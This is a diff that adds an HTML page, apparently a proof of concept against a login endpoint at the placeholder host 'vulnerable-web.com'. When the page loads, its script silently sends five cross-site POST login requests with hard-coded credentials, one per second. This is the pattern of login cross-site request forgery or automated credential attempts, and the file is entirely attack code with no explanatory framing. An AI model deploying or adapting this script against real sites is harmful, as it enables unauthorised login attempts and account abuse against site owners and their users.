@@ -1,0 +1,28 @@
+<script>
+function sendAuthenticationRequest() {
+    var xhr = new XMLHttpRequest();
+    var url = 'https://vulnerable-web.com/login';
+    var params = 'email=r@gmail.com&password=1234567890&submit=True';
+    xhr.open('POST', url, true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            console.log('Response:', xhr.responseText);
+        }
+    };
+    xhr.send(params);
+}
+window.onload = function() {
+    		for (var i = 0; i < 5; i++) {
+        	setTimeout(sendAuthenticationRequest, i * 1000);
+				//1 Authentication request is sent each second.
+    	}
+};
+</script>
+<form action="https://vulnerable-web.com/login" method="POST">
+<label for="email">Email:</label>
+   <input type="email" id="email" name="email" required><br><br>
+   <label for="password">Password:</label>
+   <input type="password" id="password" name="password" required><br><br>
+   <input type="submit" value="Login">
+</form>
